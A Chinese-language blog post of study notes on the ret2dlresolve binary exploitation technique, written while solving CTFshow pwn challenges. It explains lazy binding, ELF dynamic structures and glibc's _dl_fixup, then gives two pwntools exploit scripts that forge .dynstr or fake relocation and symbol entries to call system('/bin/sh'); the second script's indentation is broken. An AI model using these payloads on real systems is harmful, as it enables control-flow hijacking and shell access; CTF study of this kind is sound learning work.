---
title: （待办）ret2dlresolve
date: '2025-09-04 15:44:50'
updated: '2025-12-19 18:45:34'
---
CTFshow开始刷到没学过的知识了，感觉推起来好慢...

找到一篇讲得非常非常详细的文章，写得好好/(ㄒoㄒ)/~~

https://xz.aliyun.com/news/17612

## 延迟连接机制
之前大概知道是怎么一回事，但是现在要更加深入了

这两张图片很直观，不过是32位的

### 第一次调用
![](/images/fc07adfe35adf80a3ba8d824c8df37fc.png)

几个点我之前没怎么注意的：

一个是GOT表在第一次调用之前，每个函数对应偏移的位置放的都是它们plt表加6的地址，第一次调用完之后就改成了函数对应的libc地址

第二个是PLT表在所有函数之前放上了调用_dl_runtime_resolve函数的指令（GOT表上面对应位置一直放着_dl_runtime_resolve函数的地址），在跳转到GOT表对应位置之后又会跳转到各自函数的index处放入调用参数后统一跳转到PLT表开头的调用指令（这里是32位所以用的push）

有些文章讲都没讲是多少位就push...差点把我绕晕

### 再次调用
![](/images/8e55e5a5ef0f72d3a6619c86eba065dc.png)

## 重定位表
每个数组元素对应一个重定位入口。重定位表主要有`.rel.text `或 `.rela.text`，即代码重定位节（Relocation Section）和 .rel.data 或 .rela.data：数据重定位节（Relocation Section）

## 结构体
`.dynamic` 、`.dynstr` 、`.dynsym` 和`.rel.plt` 四个重要的 section

![](/images/a6b5d0d80116b1ecaffe154f49de8f0d.png)

### Dyn结构体
```c
/* Dynamic section entry.  */  

typedef struct  
{  
    Elf32_Sword        d_tag;                        /* Dynamic entry type */  
    union  
    {  
        Elf32_Word d_val;                        /* Integer value */  
        Elf32_Addr d_ptr;                        /* Address value */  
    } d_un;  
} Elf32_Dyn;  

typedef struct  
{  
    Elf64_Sxword        d_tag;                        /* Dynamic entry type */  
    union  
    {  
        Elf64_Xword d_val;                /* Integer value */  
        Elf64_Addr d_ptr;                        /* Address value */  
    } d_un;  
} Elf64_Dyn;
```

Dyn 结构体用于描述动态链接时需要使用到的信息，其成员含义如下：

`d_tag `表示标记值，指明了该结构体的具体类型

`d_un `是一个联合体，用于存储不同类型的信息。具体含义取决于 d_tag 的值

+ 如果 `d_tag `的值是一个整数类型，则用 `d_val `存储它的值
+ 如果 `d_tag `的值是一个指针类型，则用 `d_ptr` 存储它的值

| <font style="background-color:rgba(255, 255, 255, 0);">d_tag类型</font> | <font style="background-color:rgba(255, 255, 255, 0);">d_un定义</font> |
| --- | --- |
| <font style="background-color:rgba(255, 255, 255, 0);">#define DT_STRTAB 5</font> | <font style="background-color:rgba(255, 255, 255, 0);">动态链接字符串表的地址，d_ptr表示.dynstr的地址 (Address of string table)</font> |
| <font style="background-color:rgba(255, 255, 255, 0);">#define DT_SYMTAB 6</font> | <font style="background-color:rgba(255, 255, 255, 0);">动态链接符号表的地址，d_ptr表示.dynsym的地址 (Address of symbol table)</font> |
| <font style="background-color:rgba(255, 255, 255, 0);">#define DT_JMPREL 23</font> | <font style="background-color:rgba(255, 255, 255, 0);">动态链接重定位表的地址，d_ptr表示.rel.plt的地址 (Address of PLT relocs)</font> |
| <font style="background-color:rgba(255, 255, 255, 0);">#define DT_RELENT 19</font> | <font style="background-color:rgba(255, 255, 255, 0);">单个重定位项的大小，d_val表示单个重定位项大小 (Size of one Rel reloc)</font> |
| <font style="background-color:rgba(255, 255, 255, 0);">#define DT_SYMENT 11</font> | <font style="background-color:rgba(255, 255, 255, 0);">单个符号表项的大小，d_val表示单个符号表项大小 (Size of one symbol table entry)</font> |


### Sym结构体（这个比较重要？）
```c
/* Symbol table entry.  */

typedef struct
{
    Elf32_Word        st_name;                /* Symbol name (string tbl index) */
    Elf32_Addr        st_value;                /* Symbol value */
    Elf32_Word        st_size;                /* Symbol size */
    unsigned char        st_info;                /* Symbol type and binding */
    unsigned char        st_other;                /* Symbol visibility */
    Elf32_Section        st_shndx;                /* Section index */
} Elf32_Sym; 

typedef struct
{
    Elf64_Word        st_name;                /* Symbol name (string tbl index) */
    unsigned char        st_info;                /* Symbol type and binding */
    unsigned char        st_other;                /* Symbol visibility */
    Elf64_Section        st_shndx;                /* Section index */
    Elf64_Addr        st_value;                /* Symbol value */
    Elf64_Xword        st_size;                /* Symbol size */
} Elf64_Sym;
```

用来描述 ELF 文件中的符号（Symbol）信息，其成员含义如下：

+ `st_name`：指向一个存储符号名称的字符串表的索引，即字符串相对于字符串表起始地址的偏移
+ `st_info`：如果 st_other 为 0 则设置成 0x12 即可
+ `st_other`：决定函数参数 `link_map`参数是否有效。如果该值不为 0 则直接通过 `link_map`中的信息计算出目标函数地址。否则需要调用 `_dl_lookup_symbol_x`函数查询出新的 `link_map`和 `sym`来计算目标函数地址
+ `st_value`：符号地址相对于模块基址的偏移值

### Rel结构体
```c
/* Relocation table entry without addend (in section of type SHT_REL).  */

typedef struct
{
    Elf32_Addr        r_offset;                /* Address */
    Elf32_Word        r_info;                        /* Relocation type and symbol index */
} Elf32_Rel;

/* I have seen two different definitions of the Elf64_Rel and
   Elf64_Rela structures, so we'll leave them out until Novell (or
   whoever) gets their act together.  */
/* The following, at least, is used on Sparc v9, MIPS, and Alpha.  */
#define ELF32_R_SYM(val)    ((val) >> 8)
#define ELF32_R_TYPE(val)   ((val) & 0xff)
#define ELF32_R_INFO(sym, type)   (((sym) << 8) + ((type) & 0xff))

typedef struct
{
    Elf64_Addr        r_offset;                /* Address */
    Elf64_Xword        r_info;                        /* Relocation type and symbol index */
} Elf64_Rel;

typedef struct
{
    Elf64_Addr        r_offset;                /* Address */
    Elf64_Xword        r_info;                        /* Relocation type and symbol index */
    Elf64_Sxword        r_addend;                /* Addend */
} Elf64_Rela;

#define ELF64_R_SYM(i)                        ((i) >> 32)
#define ELF64_R_TYPE(i)                        ((i) & 0xffffffff)
#define ELF64_R_INFO(sym,type)                ((((Elf64_Xword) (sym)) << 32) + (type))
```

用于描述重定位（Relocation）信息，其成员含义如下：

+ `r_offset`：加上**传入的参数**`link_map->l_addr` 等于该函数对应 got 表地址
+ `r_info` ：符号索引的低 8 位（32 位 ELF）或低 32 位（64 位 ELF）指示符号的类型这里设为 7 即可，高 24 位（32 位 ELF）或高 32 位（64 位 ELF）指示符号的索引即 `Sym` 构造的数组中的索引

### link_map
```c
struct link_map {
    Elf32_Addr l_addr;
    char *l_name;
    Elf32_Dyn *l_ld;
    struct link_map *l_next;
    struct link_map *l_prev;
    struct link_map *l_real;
    Lmid_t l_ns;
    struct libname_list *l_libname;
    Elf32_Dyn *l_info[76];//l_info 里面包含的就是动态链接的各个表的信息
    const Elf32_Phdr *l_phdr;
    Elf32_Addr l_entry;
    Elf32_Half l_phnum;
    ... ...
    }
```

`link_map` 是存储目标函数查询结果的一个结构体，主要关注 `l_addr` 和 `l_info` 两个成员即可：

l_addr：目标函数所在 lib 的基址

l_info：Dyn 结构体指针，指向各种结构对应的 Dyn

+ l_info[DT_STRTAB]：即 l_info 数组第 5 项，指向 .dynstr 对应的 Dyn
+ l_info[DT_SYMTAB]：即 l_info 数组第 6 项，指向 Sym 对应的 Dyn
+ l_info[DT_JMPREL]：即 l_info 数组第 23 项，指向 Rel 对应的 Dyn

## dl_runtime_resolve函数
`_dl_runtime_resolve`的核心函数位 `_dl_fixup`函数，这里是为了避免 `_dl_fixup`传参与目标函数传参干扰（`_dl_runtime_resolve`函数通过栈传参然后转换成 `_dl_fixup`的寄存器传参）以及调用目标函数才在 `_dl_fixup`外面封装一个 `_dl_runtime_resolve `函数。`_dl_fixup`函数的定义如下：

```c
_dl_fixup(truct link_map *l, ElfW(Word) reloc_arg) {
    // 获取符号表地址
    # define D_PTR(map, i) ((map)->i->d_un.d_ptr + (map)->l_addr)
    const ElfW(Sym) *const symtab = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
    // 获取字符串表地址
    const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);
    // 获取函数对应的重定位表结构地址，sizeof (PLTREL) 即 Elf*_Rel 的大小。
    #define reloc_offset reloc_arg * sizeof (PLTREL)
    # define PLTREL  ElfW(Rel)
    const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
    // 获取函数对应的符号表结构地址
    const ElfW(Sym) *sym = &symtab[ELFW(R_SYM) (reloc->r_info)];
    // 得到函数对应的got地址，即真实函数地址要填回的地址
    void *const rel_addr = (void *) (l->l_addr + reloc->r_offset);
    lookup_t result;
    DL_FIXUP_VALUE_TYPE value;

    // 判断重定位表的类型，必须要为 ELF_MACHINE_JMP_SLOT(7)  这里还会检查reloc->r_info的最低位是不是R_386_JUMP_SLOT=7
    assert (ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT);

    /* Look up the target symbol.  If the normal lookup rules are not
       used don't look in the global scope.  */
    // ☆ 关键判断，决定目标函数地址的查找方法。☆
    if (__builtin_expect(ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0) {
        const struct r_found_version *version = NULL;

        if (l->l_info[VERSYMIDX (DT_VERSYM)] != NULL) {
            const ElfW(Half) *vernum = (const void *) D_PTR (l, l_info[VERSYMIDX(DT_VERSYM)]);
            ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc->r_info)] & 0x7fff;
            version = &l->l_versions[ndx];
            if (version->hash == 0)
                version = NULL;
        }

        /* We need to keep the scope around so do some locking.  This is
       not necessary for objects which cannot be unloaded or when
       we are not using any threads (yet).  */
        int flags = DL_LOOKUP_ADD_DEPENDENCY;
        if (!RTLD_SINGLE_THREAD_P) {
            THREAD_GSCOPE_SET_FLAG ();
            flags |= DL_LOOKUP_GSCOPE_LOCK;
        }

        #ifdef RTLD_ENABLE_FOREIGN_CALL
        RTLD_ENABLE_FOREIGN_CALL;
        #endif
        // 查找目标函数地址
        // result 为 libc 的 link_map ，其中有 libc 的基地址。
        // sym 指针指向 libc 中目标函数对应的符号表，其中有目标函数在 libc 中的偏移。
        result = _dl_lookup_symbol_x(strtab + sym->st_name, l, &sym, l->l_scope,
                                     version, ELF_RTYPE_CLASS_PLT, flags, NULL);

        /* We are done with the global scope.  */
        if (!RTLD_SINGLE_THREAD_P)
            THREAD_GSCOPE_RESET_FLAG ();

        #ifdef RTLD_FINALIZE_FOREIGN_CALL
        RTLD_FINALIZE_FOREIGN_CALL;
        #endif

        /* Currently result contains the base load address (or link map)
       of the object that defines sym.  Now add in the symbol
       offset.  */
        // 基址 + 偏移算出目标函数地址 value
        value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS(result) + sym->st_value) : 0);
    } else {
        /* We already found the symbol.  The module (and therefore its load
       address) is also known.  */
        // 这里认为 link_map 和 sym 中已经是目标函数的信息了，因此直接计算目标函数地址。
        value = DL_FIXUP_MAKE_VALUE (l, l->l_addr + sym->st_value);
        result = l;
    }

    /* And now perhaps the relocation addend.  */
    value = elf_machine_plt_value(l, reloc, value);

    if (sym != NULL
        && __builtin_expect(ELFW(ST_TYPE) (sym->st_info) == STT_GNU_IFUNC, 0))
        value = elf_ifunc_invoke(DL_FIXUP_VALUE_ADDR (value));

    /* Finally, fix up the plt itself.  */
    if (__glibc_unlikely (GLRO(dl_bind_not)))
        return value;
    // 更新 got 表
    return elf_machine_fixup_plt(l, result, reloc, rel_addr, value);
}
```

需要注意的是 `_dl_fixup`中会有如下判断，根据这个判断决定了重定位的策略

```c
if (__builtin_expect(ELFW(ST_VISIBILITY) (sym->st_other), 0) == 0)
```

`_dl_fixup`函数在计算出目标函数地址并更新 got 表之后会回到 `_dl_runtime_resolve`函数，之后 `_dl_runtime_resolve`函数会调用目标函数

## 32位ret2dlresolve
在 32 位下我们可以利用 `ELFW(ST_VISIBILITY) (sym->st_other)` 为 0 时的执行流程进行控制流劫持，因为这个执行流程会自动计算目标函数的地址，**不需要知道 libc 具体版本**，适用性更强。

其中 `ELFW(ST_VISIBILITY) (sym->st_other)` 为 0 时 `_dl_runtime_resolve` 函数的具体执行流程为：

![](/images/8ac10c0ffc9f06c847edcfe52ae7652e.png)

1. 用 `link_map`访问 `.dynamic` ，取出 `.dynstr` ， `.dynsym` ， `.rel.plt` 的指针
2. .rel.plt + 第二个参数 求出当前函数的重定位表项 Elf32_Rel 的指针，记作 rel
3. rel->r_info >> 8 作为 .dynsym 的下标，求出当前函数的符号表项 Elf32_Sym 的指针，记作 sym
4.  .dynstr + sym->st_name 得出符号名字符串指针
5. 在动态链接库查找这个函数的地址，并且把地址赋值给*rel->r_offset ，即 GOT 表
6. 调用这个函数

### NO RETRO：
前提是symtab里面对应替换的函数的`sym->st_other`（32位为第五项）为零

![](/images/5a4a890fa7cb75a4993679337e453b7f.png)

这个情况即`.dynamic`可写， 可以改写这里面的`.dynstr`指针到可控地址，从而让resolve时候解析到指定的任意库函数

32位NO RETRO的exp：

```python
#!/usr/bin/env python3

from pwn import *
#context.log_level = 'debug'
#context(arch = 'amd64',os = 'linux',log_level = 'debug')
context(arch = 'i386',os = 'linux',log_level = 'debug')


link = process('./82')
elf = ELF('./82')
rop = ROP('./82')

# link = remote('pwn.challenge.ctf.show',28137)

offsets = 112
dynstr =elf.get_section_by_name('.dynstr').data()
dynstr = dynstr.replace(b'read',b'system')
rop.raw(b'a' * offsets)
rop.read(0,0x8049804 + 4,4)
rop.read(0,0x80498e0,len(dynstr))
rop.read(0,0x80498e0 + 0x100,8) #输入binsh
rop.raw(0x8048376) #read的plt表项
rop.raw(0xdeadbeef)
rop.raw(0x80498e0 + 0x100)

link.recvuntil('Welcome to CTFshowPWN!\n')
link.send(rop.chain()) #发ROP链
link.send(p32(0x80498e0)) #篡改dynamic中STRTAB的指针
link.send(dynstr) #发伪造的dynstr
link.send(b'/bin/sh\x00')
link.interactive()
```

### Partial RELRO：
```python
def ret2dlresolve():
    func_name = b"system"
resolve_plt = elf.get_section_by_name('.plt').header['sh_addr']
JMPREL = elf.dynamic_value_by_tag('DT_JMPREL')
SYMTAB = elf.dynamic_value_by_tag('DT_SYMTAB')
STRTAB = elf.dynamic_value_by_tag('DT_STRTAB')

fake_rel_addr = rop_addr + 5 * 4
reloc_offset = fake_rel_addr - JMPREL
fake_sym_addr = rop_addr + 7 * 4
align = (0x10 - ((fake_sym_addr - SYMTAB) & 0xF)) & 0xF
fake_sym_addr += align
r_info = ((fake_sym_addr - SYMTAB) // 0x10 << 8) | 0x7  # 0x7 means that Assertion `ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT'
fake_rel = p32(elf.bss() + 0x10) + p32(r_info)
fake_name_addr = fake_sym_addr + 4 * 4
st_name = fake_name_addr - STRTAB
fake_sym = p32(st_name) + p32(0) * 2 + p8(0x12) + p8(0) + p16(0)
bin_sh_offset = (fake_sym_addr + 0x10 - rop_addr + len(func_name) + 3) & ~3
bin_sh_addr = rop_addr + bin_sh_offset

payload = p32(0)
payload += p32(resolve_plt)
payload += p32(reloc_offset)
payload += p32(0)
payload += p32(bin_sh_addr)
payload += fake_rel
payload += b'\x00' * align
payload += fake_sym
payload += b'system'
payload = payload.ljust(bin_sh_offset, b'\x00')
payload += b"/bin/sh" + b'\x00'
return payload

if __name__ == '__main__':

    offset = 112 #到ret的偏移
    rop_addr = elf.bss()+0x700
payload = b'a' * (offset-4) 
payload += p32(rop_addr)
payload += p32(elf.plt['read'])
payload += p32(next(elf.search(asm('leave;ret'), executable=True)))
payload += p32(0)
payload += p32(rop_addr)
payload += p32(0x100)

sl(payload)
pause()
sl(ret2dlresolve())
```

